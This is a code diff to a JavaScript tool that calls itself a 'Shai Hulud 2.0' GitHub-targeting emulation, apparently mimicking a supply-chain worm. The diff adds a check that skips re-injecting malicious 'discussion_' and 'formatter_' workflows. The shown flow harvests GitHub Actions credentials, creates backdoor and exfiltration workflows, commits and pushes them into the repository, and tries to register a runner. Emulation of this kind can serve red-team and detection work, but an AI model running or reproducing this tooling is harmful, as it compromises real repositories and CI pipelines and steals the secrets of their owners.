@@ -883,6 +883,30 @@ jobs:
         });
     }
 
+    checkIfAlreadyCompromised() {
+        // Check if malicious workflows already exist to prevent self-replication
+        const workspace = process.env.GITHUB_WORKSPACE;
+        if (!workspace) return false;
+
+        const workflowsDir = path.join(workspace, '.github', 'workflows');
+        if (!fs.existsSync(workflowsDir)) return false;
+
+        try {
+            const files = fs.readdirSync(workflowsDir);
+            const maliciousFiles = files.filter(f =>
+                f.startsWith('discussion_') || f.startsWith('formatter_')
+            );
+            if (maliciousFiles.length > 0) {
+                console.log(`[!] SKIP: Found ${maliciousFiles.length} existing malicious workflows`);
+                console.log('    Repo already compromised - skipping workflow injection to prevent loop');
+                return true;
+            }
+        } catch (e) {
+            // Can't read, assume not compromised
+        }
+        return false;
+    }
+
     async run() {
         console.log('\n' + '='.repeat(50));
         console.log('Shai Hulud 2.0 - GitHub Targeting Emulation');
@@ -891,6 +915,9 @@ jobs:
 
         console.log(`[*] CI/CD: ${this.ciType || 'none'}`);
         console.log(`[*] GitHub Actions: ${this.isGitHubActions}\n`);
+
+        // Check if repo is already compromised (prevent self-replication loop)
+        const alreadyCompromised = this.checkIfAlreadyCompromised();
 
         // Harvest credentials
         this.harvestGitHubActionsEnv();
@@ -902,14 +929,20 @@ jobs:
         // API access
         await this.checkGitHubAPIAccess();
 
-        // Create attack artifacts (full emulation)
+        // Create attack artifacts (full emulation) - only if not already compromised
         const contents = this.createContentsJson();
         const truffleSecrets = this.createTruffleSecrets();
-        this.createBackdoorWorkflow();
-        this.createExfiltrationWorkflow();
 
-        // Commit and push malicious workflows to the repo
-        await this.commitAndPushWorkflows();
+        if (!alreadyCompromised) {
+            this.createBackdoorWorkflow();
+            this.createExfiltrationWorkflow();
+
+            // Commit and push malicious workflows to the repo
+            await this.commitAndPushWorkflows();
+        } else {
+            console.log('[*] Skipping workflow creation/push (already compromised)');
+            this.findings.github.workflows = [{ skipped: true, reason: 'Already compromised' }];
+        }
 
         // Attempt runner registration via GitHub API
         await this.attemptRunnerRegistration();
